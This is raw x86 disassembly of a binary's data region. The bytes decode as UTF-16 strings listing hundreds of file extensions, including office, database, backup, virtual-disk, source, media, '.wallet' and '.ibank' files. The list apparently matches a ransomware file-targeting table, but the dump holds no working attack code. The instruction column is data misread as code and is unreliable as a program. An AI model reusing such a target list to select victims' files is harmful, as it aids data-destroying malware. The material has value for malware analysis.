  406db3:	2e 00 6c 00 7a       	add    %ch,%cs:0x7a(%eax,%eax,1)
  406db8:	00 68 00             	add    %ch,0x0(%eax)
  406dbb:	00 09                	add    %cl,(%ecx)
  406dbd:	2e 00 74 00 61       	add    %dh,%cs:0x61(%eax,%eax,1)
  406dc2:	00 72 00             	add    %dh,0x0(%edx)
  406dc5:	00 0b                	add    %cl,(%ebx)
  406dc7:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  406dcb:	70 00                	jo     0x406dcd
  406dcd:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  406dd1:	00 07                	add    %al,(%edi)
  406dd3:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406dd7:	7a 00                	jp     0x406dd9
  406dd9:	00 0b                	add    %cl,(%ebx)
  406ddb:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406ddf:	70 00                	jo     0x406de1
  406de1:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  406de5:	00 11                	add    %dl,(%ecx)
  406de7:	2e 00 74 00 6f       	add    %dh,%cs:0x6f(%eax,%eax,1)
  406dec:	00 72 00             	add    %dh,0x0(%edx)
  406def:	72 00                	jb     0x406df1
  406df1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406df5:	74 00                	je     0x406df7
  406df7:	00 09                	add    %cl,(%ecx)
  406df9:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406dfd:	70 00                	jo     0x406dff
  406dff:	67 00 00             	add    %al,(%bx,%si)
  406e02:	0b 2e                	or     (%esi),%ebp
  406e04:	00 63 00             	add    %ah,0x0(%ebx)
  406e07:	6f                   	outsl  %ds:(%esi),(%dx)
  406e08:	00 72 00             	add    %dh,0x0(%edx)
  406e0b:	65 00 00             	add    %al,%gs:(%eax)
  406e0e:	09 2e                	or     %ebp,(%esi)
  406e10:	00 70 00             	add    %dh,0x0(%eax)
  406e13:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  406e17:	00 09                	add    %cl,(%ecx)
  406e19:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  406e1d:	63 00                	arpl   %eax,(%eax)
  406e1f:	6f                   	outsl  %ds:(%esi),(%dx)
  406e20:	00 00                	add    %al,(%eax)
  406e22:	09 2e                	or     %ebp,(%esi)
  406e24:	00 70 00             	add    %dh,0x0(%eax)
  406e27:	61                   	popa
  406e28:	00 73 00             	add    %dh,0x0(%ebx)
  406e2b:	00 07                	add    %al,(%edi)
  406e2d:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  406e32:	00 00                	add    %al,(%eax)
  406e34:	09 2e                	or     %ebp,(%esi)
  406e36:	00 77 00             	add    %dh,0x0(%edi)
  406e39:	6d                   	insl   (%dx),%es:(%edi)
  406e3a:	00 76 00             	add    %dh,0x0(%esi)
  406e3d:	00 09                	add    %cl,(%ecx)
  406e3f:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406e43:	77 00                	ja     0x406e45
  406e45:	66 00 00             	data16 add %al,(%eax)
  406e48:	09 2e                	or     %ebp,(%esi)
  406e4a:	00 63 00             	add    %ah,0x0(%ebx)
  406e4d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406e51:	00 09                	add    %cl,(%ecx)
  406e53:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406e57:	61                   	popa
  406e58:	00 6b 00             	add    %ch,0x0(%ebx)
  406e5b:	00 0f                	add    %cl,(%edi)
  406e5d:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406e61:	61                   	popa
  406e62:	00 63 00             	add    %ah,0x0(%ebx)
  406e65:	6b 00 75             	imul   $0x75,(%eax),%eax
  406e68:	00 70 00             	add    %dh,0x0(%eax)
  406e6b:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  406e71:	63 00                	arpl   %eax,(%eax)
  406e73:	63 00                	arpl   %eax,(%eax)
  406e75:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  406e79:	00 09                	add    %cl,(%ecx)
  406e7b:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406e7f:	61                   	popa
  406e80:	00 79 00             	add    %bh,0x0(%ecx)
  406e83:	00 09                	add    %cl,(%ecx)
  406e85:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406e89:	37                   	aaa
  406e8a:	00 63 00             	add    %ah,0x0(%ebx)
  406e8d:	00 0b                	add    %cl,(%ebx)
  406e8f:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  406e93:	78 00                	js     0x406e95
  406e95:	69 00 66 00 00 09    	imul   $0x9000066,(%eax),%eax
  406e9b:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  406e9f:	73 00                	jae    0x406ea1
  406ea1:	73 00                	jae    0x406ea3
  406ea3:	00 09                	add    %cl,(%ecx)
  406ea5:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  406ea9:	61                   	popa
  406eaa:	00 77 00             	add    %dh,0x0(%edi)
  406ead:	00 09                	add    %cl,(%ecx)
  406eaf:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406eb3:	34 00                	xor    $0x0,%al
  406eb5:	61                   	popa
  406eb6:	00 00                	add    %al,(%eax)
  406eb8:	09 2e                	or     %ebp,(%esi)
  406eba:	00 77 00             	add    %dh,0x0(%edi)
  406ebd:	6d                   	insl   (%dx),%es:(%edi)
  406ebe:	00 61 00             	add    %ah,0x0(%ecx)
  406ec1:	00 09                	add    %cl,(%ecx)
  406ec3:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  406ec7:	6c                   	insb   (%dx),%es:(%edi)
  406ec8:	00 76 00             	add    %dh,0x0(%esi)
  406ecb:	00 09                	add    %cl,(%ecx)
  406ecd:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406ed1:	69 00 65 00 00 09    	imul   $0x9000065,(%eax),%eax
  406ed7:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406edb:	75 00                	jne    0x406edd
  406edd:	6d                   	insl   (%dx),%es:(%edi)
  406ede:	00 00                	add    %al,(%eax)
  406ee0:	0d 2e 00 69 00       	or     $0x69002e,%eax
  406ee5:	62 00                	bound  %eax,(%eax)
  406ee7:	61                   	popa
  406ee8:	00 6e 00             	add    %ch,0x0(%esi)
  406eeb:	6b 00 00             	imul   $0x0,(%eax),%eax
  406eee:	0f 2e 00             	ucomiss (%eax),%xmm0
  406ef1:	77 00                	ja     0x406ef3
  406ef3:	61                   	popa
  406ef4:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  406ef8:	00 65 00             	add    %ah,0x0(%ebp)
  406efb:	74 00                	je     0x406efd
  406efd:	00 09                	add    %cl,(%ecx)
  406eff:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406f03:	73 00                	jae    0x406f05
  406f05:	73 00                	jae    0x406f07
  406f07:	00 07                	add    %al,(%edi)
  406f09:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  406f0d:	73 00                	jae    0x406f0f
  406f0f:	00 07                	add    %al,(%edi)
  406f11:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  406f15:	62 00                	bound  %eax,(%eax)
  406f17:	00 09                	add    %cl,(%ecx)
  406f19:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406f1d:	72 00                	jb     0x406f1f
  406f1f:	74 00                	je     0x406f21
  406f21:	00 0b                	add    %cl,(%ebx)
  406f23:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406f27:	6c                   	insb   (%dx),%es:(%edi)
  406f28:	00 73 00             	add    %dh,0x0(%ebx)
  406f2b:	6d                   	insl   (%dx),%es:(%edi)
  406f2c:	00 00                	add    %al,(%eax)
  406f2e:	0b 2e                	or     (%esi),%ebp
  406f30:	00 78 00             	add    %bh,0x0(%eax)
  406f33:	6c                   	insb   (%dx),%es:(%edi)
  406f34:	00 73 00             	add    %dh,0x0(%ebx)
  406f37:	62 00                	bound  %eax,(%eax)
  406f39:	00 07                	add    %al,(%edi)
  406f3b:	2e 00 37             	add    %dh,%cs:(%edi)
  406f3e:	00 7a 00             	add    %bh,0x0(%edx)
  406f41:	00 09                	add    %cl,(%ecx)
  406f43:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406f47:	70 00                	jo     0x406f49
  406f49:	70 00                	jo     0x406f4b
  406f4b:	00 0b                	add    %cl,(%ebx)
  406f4d:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  406f51:	61                   	popa
  406f52:	00 76 00             	add    %dh,0x0(%esi)
  406f55:	61                   	popa
  406f56:	00 00                	add    %al,(%eax)
  406f58:	09 2e                	or     %ebp,(%esi)
  406f5a:	00 6a 00             	add    %ch,0x0(%edx)
  406f5d:	70 00                	jo     0x406f5f
  406f5f:	65 00 00             	add    %al,%gs:(%eax)
  406f62:	09 2e                	or     %ebp,(%esi)
  406f64:	00 69 00             	add    %ch,0x0(%ecx)
  406f67:	6e                   	outsb  %ds:(%esi),(%dx)
  406f68:	00 69 00             	add    %ch,0x0(%ecx)
  406f6b:	00 0b                	add    %cl,(%ebx)
  406f6d:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406f71:	6c                   	insb   (%dx),%es:(%edi)
  406f72:	00 6f 00             	add    %ch,0x0(%edi)
  406f75:	62 00                	bound  %eax,(%eax)
  406f77:	00 09                	add    %cl,(%ecx)
  406f79:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406f7d:	70 00                	jo     0x406f7f
  406f7f:	73 00                	jae    0x406f81
  406f81:	00 0b                	add    %cl,(%ebx)
  406f83:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  406f88:	00 63 00             	add    %ah,0x0(%ebx)
  406f8b:	6d                   	insl   (%dx),%es:(%edi)
  406f8c:	00 00                	add    %al,(%eax)
  406f8e:	09 2e                	or     %ebp,(%esi)
  406f90:	00 77 00             	add    %dh,0x0(%edi)
  406f93:	61                   	popa
  406f94:	00 76 00             	add    %dh,0x0(%esi)
  406f97:	00 09                	add    %cl,(%ecx)
  406f99:	2e 00 33             	add    %dh,%cs:(%ebx)
  406f9c:	00 67 00             	add    %ah,0x0(%edi)
  406f9f:	70 00                	jo     0x406fa1
  406fa1:	00 0b                	add    %cl,(%ebx)
  406fa3:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406fa7:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  406fab:	6d                   	insl   (%dx),%es:(%edi)
  406fac:	00 00                	add    %al,(%eax)
  406fae:	09 2e                	or     %ebp,(%esi)
  406fb0:	00 6d 00             	add    %ch,0x0(%ebp)
  406fb3:	34 00                	xor    $0x0,%al
  406fb5:	76 00                	jbe    0x406fb7
  406fb7:	00 09                	add    %cl,(%ecx)
  406fb9:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406fbd:	6d                   	insl   (%dx),%es:(%edi)
  406fbe:	00 76 00             	add    %dh,0x0(%esi)
  406fc1:	00 09                	add    %cl,(%ecx)
  406fc3:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406fc7:	34 00                	xor    $0x0,%al
  406fc9:	70 00                	jo     0x406fcb
  406fcb:	00 09                	add    %cl,(%ecx)
  406fcd:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406fd1:	76 00                	jbe    0x406fd3
  406fd3:	67 00 00             	add    %al,(%bx,%si)
  406fd6:	09 2e                	or     %ebp,(%esi)
  406fd8:	00 6f 00             	add    %ch,0x0(%edi)
  406fdb:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  406fdf:	00 07                	add    %al,(%edi)
  406fe1:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406fe5:	6b 00 00             	imul   $0x0,(%eax),%eax
  406fe8:	09 2e                	or     %ebp,(%esi)
  406fea:	00 76 00             	add    %dh,0x0(%esi)
  406fed:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  406ff1:	00 0b                	add    %cl,(%ebx)
  406ff3:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  406ff7:	6d                   	insl   (%dx),%es:(%edi)
  406ff8:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  406ffc:	00 00                	add    %al,(%eax)
  406ffe:	0f 2e 00             	ucomiss (%eax),%xmm0
  407001:	6f                   	outsl  %ds:(%esi),(%dx)
  407002:	00 6e 00             	add    %ch,0x0(%esi)
  407005:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  407009:	6b 00 67             	imul   $0x67,(%eax),%eax
  40700c:	00 00                	add    %al,(%eax)
  40700e:	0d 2e 00 61 00       	or     $0x61002e,%eax
  407013:	63 00                	arpl   %eax,(%eax)
  407015:	63 00                	arpl   %eax,(%eax)
  407017:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40701b:	00 09                	add    %cl,(%ecx)
  40701d:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  407021:	73 00                	jae    0x407023
  407023:	70 00                	jo     0x407025
  407025:	00 0b                	add    %cl,(%ebx)
  407027:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  40702b:	73 00                	jae    0x40702d
  40702d:	6f                   	outsl  %ds:(%esi),(%dx)
  40702e:	00 6e 00             	add    %ch,0x0(%esi)
  407031:	00 09                	add    %cl,(%ecx)
  407033:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  407037:	69 00 66 00 00 09    	imul   $0x9000066,(%eax),%eax
  40703d:	2e 00 6c 00 6f       	add    %ch,%cs:0x6f(%eax,%eax,1)
  407042:	00 67 00             	add    %ah,0x0(%edi)
  407045:	00 07                	add    %al,(%edi)
  407047:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  40704b:	7a 00                	jp     0x40704d
  40704d:	00 0f                	add    %cl,(%edi)
  40704f:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407053:	6f                   	outsl  %ds:(%esi),(%dx)
  407054:	00 6e 00             	add    %ch,0x0(%esi)
  407057:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40705b:	67 00 00             	add    %al,(%bx,%si)
  40705e:	07                   	pop    %es
  40705f:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  407063:	62 00                	bound  %eax,(%eax)
  407065:	00 09                	add    %cl,(%ecx)
  407067:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40706b:	31 00                	xor    %eax,(%eax)
  40706d:	76 00                	jbe    0x40706f
  40706f:	00 09                	add    %cl,(%ecx)
  407071:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  407075:	6c                   	insb   (%dx),%es:(%edi)
  407076:	00 6e 00             	add    %ch,0x0(%esi)
  407079:	00 09                	add    %cl,(%ecx)
  40707b:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40707f:	73 00                	jae    0x407081
  407081:	74 00                	je     0x407083
  407083:	00 09                	add    %cl,(%ecx)
  407085:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  407089:	62 00                	bound  %eax,(%eax)
  40708b:	6a 00                	push   $0x0
  40708d:	00 0b                	add    %cl,(%ebx)
  40708f:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407093:	6c                   	insb   (%dx),%es:(%edi)
  407094:	00 61 00             	add    %ah,0x0(%ecx)
  407097:	6d                   	insl   (%dx),%es:(%edi)
  407098:	00 00                	add    %al,(%eax)
  40709a:	0b 2e                	or     (%esi),%ebp
  40709c:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  4070a0:	00 76 00             	add    %dh,0x0(%esi)
  4070a3:	75 00                	jne    0x4070a5
  4070a5:	00 09                	add    %cl,(%ecx)
  4070a7:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  4070ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ac:	00 63 00             	add    %ah,0x0(%ebx)
  4070af:	00 09                	add    %cl,(%ecx)
  4070b1:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4070b5:	76 00                	jbe    0x4070b7
  4070b7:	73 00                	jae    0x4070b9
  4070b9:	00 09                	add    %cl,(%ecx)
  4070bb:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  4070c0:	00 66 00             	add    %ah,0x0(%esi)
  4070c3:	00 09                	add    %cl,(%ecx)
  4070c5:	2e 00 74 00 62       	add    %dh,%cs:0x62(%eax,%eax,1)
  4070ca:	00 69 00             	add    %ch,0x0(%ecx)
  4070cd:	00 09                	add    %cl,(%ecx)
  4070cf:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  4070d3:	70 00                	jo     0x4070d5
  4070d5:	64 00 00             	add    %al,%fs:(%eax)
  4070d8:	09 2e                	or     %ebp,(%esi)
  4070da:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4070de:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4070e2:	0b 2e                	or     (%esi),%ebp
  4070e4:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4070e8:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  4070ec:	00 00                	add    %al,(%eax)
  4070ee:	0b 2e                	or     (%esi),%ebp
  4070f0:	00 78 00             	add    %bh,0x0(%eax)
  4070f3:	6c                   	insb   (%dx),%es:(%edi)
  4070f4:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  4070f8:	00 00                	add    %al,(%eax)
  4070fa:	0b 2e                	or     (%esi),%ebp
  4070fc:	00 70 00             	add    %dh,0x0(%eax)
  4070ff:	70 00                	jo     0x407101
  407101:	74 00                	je     0x407103
  407103:	6d                   	insl   (%dx),%es:(%edi)
  407104:	00 00                	add    %al,(%eax)
  407106:	0b 2e                	or     (%esi),%ebp
  407108:	00 70 00             	add    %dh,0x0(%eax)
  40710b:	6f                   	outsl  %ds:(%esi),(%dx)
  40710c:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  407110:	00 00                	add    %al,(%eax)
  407112:	0b 2e                	or     (%esi),%ebp
  407114:	00 70 00             	add    %dh,0x0(%eax)
  407117:	6f                   	outsl  %ds:(%esi),(%dx)
  407118:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40711c:	00 00                	add    %al,(%eax)
  40711e:	09 2e                	or     %ebp,(%esi)
  407120:	00 70 00             	add    %dh,0x0(%eax)
  407123:	6f                   	outsl  %ds:(%esi),(%dx)
  407124:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407128:	09 2e                	or     %ebp,(%esi)
  40712a:	00 78 00             	add    %bh,0x0(%eax)
  40712d:	6c                   	insb   (%dx),%es:(%edi)
  40712e:	00 77 00             	add    %dh,0x0(%edi)
  407131:	00 09                	add    %cl,(%ecx)
  407133:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407137:	70 00                	jo     0x407139
  407139:	73 00                	jae    0x40713b
  40713b:	00 09                	add    %cl,(%ecx)
  40713d:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407141:	73 00                	jae    0x407143
  407143:	64 00 00             	add    %al,%fs:(%eax)
  407146:	09 2e                	or     %ebp,(%esi)
  407148:	00 78 00             	add    %bh,0x0(%eax)
  40714b:	73 00                	jae    0x40714d
  40714d:	66 00 00             	data16 add %al,(%eax)
  407150:	09 2e                	or     %ebp,(%esi)
  407152:	00 78 00             	add    %bh,0x0(%eax)
  407155:	73 00                	jae    0x407157
  407157:	6c                   	insb   (%dx),%es:(%edi)
  407158:	00 00                	add    %al,(%eax)
  40715a:	09 2e                	or     %ebp,(%esi)
  40715c:	00 6b 00             	add    %ch,0x0(%ebx)
  40715f:	6d                   	insl   (%dx),%es:(%edi)
  407160:	00 7a 00             	add    %bh,0x0(%edx)
  407163:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  407169:	63 00                	arpl   %eax,(%eax)
  40716b:	63 00                	arpl   %eax,(%eax)
  40716d:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  407171:	00 09                	add    %cl,(%ecx)
  407173:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  407177:	74 00                	je     0x407179
  407179:	6d                   	insl   (%dx),%es:(%edi)
  40717a:	00 00                	add    %al,(%eax)
  40717c:	0d 2e 00 61 00       	or     $0x61002e,%eax
  407181:	63 00                	arpl   %eax,(%eax)
  407183:	63 00                	arpl   %eax,(%eax)
  407185:	64 00 74 00 00       	add    %dh,%fs:0x0(%eax,%eax,1)
  40718a:	0b 2e                	or     (%esi),%ebp
  40718c:	00 70 00             	add    %dh,0x0(%eax)
  40718f:	70 00                	jo     0x407191
  407191:	61                   	popa
  407192:	00 6d 00             	add    %ch,0x0(%ebp)
  407195:	00 09                	add    %cl,(%ecx)
  407197:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40719b:	70 00                	jo     0x40719d
  40719d:	73 00                	jae    0x40719f
  40719f:	00 0b                	add    %cl,(%ebx)
  4071a1:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4071a5:	70 00                	jo     0x4071a7
  4071a7:	73 00                	jae    0x4071a9
  4071a9:	6d                   	insl   (%dx),%es:(%edi)
  4071aa:	00 00                	add    %al,(%eax)
  4071ac:	09 2e                	or     %ebp,(%esi)
  4071ae:	00 31                	add    %dh,(%ecx)
  4071b0:	00 63 00             	add    %ah,0x0(%ebx)
  4071b3:	64 00 00             	add    %al,%fs:(%eax)
  4071b6:	09 2e                	or     %ebp,(%esi)
  4071b8:	00 33                	add    %dh,(%ebx)
  4071ba:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  4071be:	00 00                	add    %al,(%eax)
  4071c0:	09 2e                	or     %ebp,(%esi)
  4071c2:	00 33                	add    %dh,(%ebx)
  4071c4:	00 66 00             	add    %ah,0x0(%esi)
  4071c7:	72 00                	jb     0x4071c9
  4071c9:	00 09                	add    %cl,(%ecx)
  4071cb:	2e 00 33             	add    %dh,%cs:(%ebx)
  4071ce:	00 67 00             	add    %ah,0x0(%edi)
  4071d1:	32 00                	xor    (%eax),%al
  4071d3:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  4071d9:	63 00                	arpl   %eax,(%eax)
  4071db:	63 00                	arpl   %eax,(%eax)
  4071dd:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4071e1:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  4071e7:	63 00                	arpl   %eax,(%eax)
  4071e9:	63 00                	arpl   %eax,(%eax)
  4071eb:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  4071ef:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  4071f5:	63 00                	arpl   %eax,(%eax)
  4071f7:	63 00                	arpl   %eax,(%eax)
  4071f9:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  4071fd:	00 09                	add    %cl,(%ecx)
  4071ff:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407203:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  407207:	00 07                	add    %al,(%edi)
  407209:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40720d:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  407213:	61                   	popa
  407214:	00 69 00             	add    %ch,0x0(%ecx)
  407217:	33 00                	xor    (%eax),%eax
  407219:	00 09                	add    %cl,(%ecx)
  40721b:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40721f:	69 00 34 00 00 09    	imul   $0x9000034,(%eax),%eax
  407225:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407229:	69 00 35 00 00 09    	imul   $0x9000035,(%eax),%eax
  40722f:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407233:	69 00 36 00 00 09    	imul   $0x9000036,(%eax),%eax
  407239:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40723d:	69 00 37 00 00 09    	imul   $0x9000037,(%eax),%eax
  407243:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407247:	69 00 38 00 00 09    	imul   $0x9000038,(%eax),%eax
  40724d:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407251:	72 00                	jb     0x407253
  407253:	77 00                	ja     0x407255
  407255:	00 0b                	add    %cl,(%ebx)
  407257:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40725b:	73 00                	jae    0x40725d
  40725d:	63 00                	arpl   %eax,(%eax)
  40725f:	78 00                	js     0x407261
  407261:	00 09                	add    %cl,(%ecx)
  407263:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407267:	73 00                	jae    0x407269
  407269:	6d                   	insl   (%dx),%es:(%edi)
  40726a:	00 00                	add    %al,(%eax)
  40726c:	0b 2e                	or     (%esi),%ebp
  40726e:	00 61 00             	add    %ah,0x0(%ecx)
  407271:	73 00                	jae    0x407273
  407273:	6d                   	insl   (%dx),%es:(%edi)
  407274:	00 78 00             	add    %bh,0x0(%eax)
  407277:	00 09                	add    %cl,(%ecx)
  407279:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40727d:	76 00                	jbe    0x40727f
  40727f:	73 00                	jae    0x407281
  407281:	00 09                	add    %cl,(%ecx)
  407283:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  407287:	69 00 6e 00 00 09    	imul   $0x900006e,(%eax),%eax
  40728d:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407291:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  407295:	00 09                	add    %cl,(%ecx)
  407297:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  40729c:	00 78 00             	add    %bh,0x0(%eax)
  40729f:	00 09                	add    %cl,(%ecx)
  4072a1:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  4072a6:	00 6d 00             	add    %ch,0x0(%ebp)
  4072a9:	00 09                	add    %cl,(%ecx)
  4072ab:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  4072b0:	00 72 00             	add    %dh,0x0(%edx)
  4072b3:	00 0b                	add    %cl,(%ebx)
  4072b5:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4072b9:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  4072bf:	00 0b                	add    %cl,(%ebx)
  4072c1:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  4072c5:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  4072c9:	65 00 00             	add    %al,%gs:(%eax)
  4072cc:	09 2e                	or     %ebp,(%esi)
  4072ce:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  4072d2:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4072d6:	09 2e                	or     %ebp,(%esi)
  4072d8:	00 66 00             	add    %ah,0x0(%esi)
  4072db:	34 00                	xor    $0x0,%al
  4072dd:	76 00                	jbe    0x4072df
  4072df:	00 09                	add    %cl,(%ecx)
  4072e1:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4072e5:	78 00                	js     0x4072e7
  4072e7:	72 00                	jb     0x4072e9
  4072e9:	00 09                	add    %cl,(%ecx)
  4072eb:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4072ef:	77 00                	ja     0x4072f1
  4072f1:	6d                   	insl   (%dx),%es:(%edi)
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	09 2e                	or     %ebp,(%esi)
  4072f6:	00 6d 00             	add    %ch,0x0(%ebp)
  4072f9:	61                   	popa
  4072fa:	00 78 00             	add    %bh,0x0(%eax)
  4072fd:	00 09                	add    %cl,(%ecx)
  4072ff:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  407303:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407307:	00 09                	add    %cl,(%ecx)
  407309:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40730d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407311:	00 09                	add    %cl,(%ecx)
  407313:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  407317:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40731b:	00 09                	add    %cl,(%ecx)
  40731d:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  407321:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  407325:	00 09                	add    %cl,(%ecx)
  407327:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40732b:	68 00 74 00 00       	push   $0x7400
  407330:	09 2e                	or     %ebp,(%esi)
  407332:	00 6d 00             	add    %ch,0x0(%ebp)
  407335:	70 00                	jo     0x407337
  407337:	76 00                	jbe    0x407339
  407339:	00 09                	add    %cl,(%ecx)
  40733b:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40733f:	73 00                	jae    0x407341
  407341:	67 00 00             	add    %al,(%bx,%si)
  407344:	09 2e                	or     %ebp,(%esi)
  407346:	00 6d 00             	add    %ch,0x0(%ebp)
  407349:	79 00                	jns    0x40734b
  40734b:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  407351:	6e                   	outsb  %ds:(%esi),(%dx)
  407352:	00 65 00             	add    %ah,0x0(%ebp)
  407355:	66 00 00             	data16 add %al,(%eax)
  407358:	09 2e                	or     %ebp,(%esi)
  40735a:	00 6f 00             	add    %ch,0x0(%edi)
  40735d:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  407361:	00 09                	add    %cl,(%ecx)
  407363:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  407367:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40736b:	00 0d 2e 00 73 00    	add    %cl,0x73002e
  407371:	77 00                	ja     0x407373
